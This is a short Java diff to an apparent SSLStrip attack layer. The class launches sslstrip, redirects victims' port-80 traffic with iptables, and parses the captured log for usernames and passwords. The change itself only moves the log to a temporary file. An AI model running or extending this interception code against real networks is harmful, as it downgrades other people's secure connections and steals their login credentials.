@@ -31,6 +31,7 @@ public class SSLStripLayer {
 	private static final int SSLSTRIP_PORT = 8080;
 	private Process sslStripProcess;
 	private List<UserInfoListener> userInfoListeners = new LinkedList<UserInfoListener>();
+	private File sslStripLog = File.createTempFile("sslstrip", ".log");
 	
 	class MatchTarget {
 		public String domainRegex, varMatchKey, varMatchValue, varUser, varPass, varDisplayName;
@@ -55,7 +56,7 @@ public class SSLStripLayer {
 	
 	public SSLStripLayer(final NetworkInterface device) throws IOException {
 		this.deviceName = device.name;
-		sslStripProcess= Runtime.getRuntime().exec("sslstrip -k -f -l 8080 -w /tmp/sslstrip.log");
+		sslStripProcess= Runtime.getRuntime().exec("sslstrip -k -f -l 8080 -w " + sslStripLog.getAbsolutePath());
 		if (System.getProperty("os.name").startsWith("Windows")) {
 			//TODO use something like "netsh interface portproxy add v4tov4 8000 192.168.0.100 9000"
 		} else {
@@ -81,7 +82,7 @@ public class SSLStripLayer {
 					} catch (InterruptedException e) { throw new RuntimeException(e); }
 					BufferedReader in;
 					try {
-						in = new BufferedReader(new InputStreamReader(new FileInputStream("/tmp/sslstrip.log")));
+						in = new BufferedReader(new InputStreamReader(new FileInputStream(sslStripLog)));
 					} catch (FileNotFoundException e) { throw new RuntimeException(e); }
 					while (true) {
 					    String line = in.readLine();
@@ -186,7 +187,7 @@ public class SSLStripLayer {
 			Runtime.getRuntime().exec("iptables -t nat -D PREROUTING -i " + deviceName + " -p tcp --dport 80 -j REDIRECT --to-port " + SSLSTRIP_PORT);
 		}
 		sslStripProcess.destroy();
-		new File("/tmp/sslstrip.log").delete();
+		sslStripLog.delete();
 		sslStripProcess = null;
 	}
 	
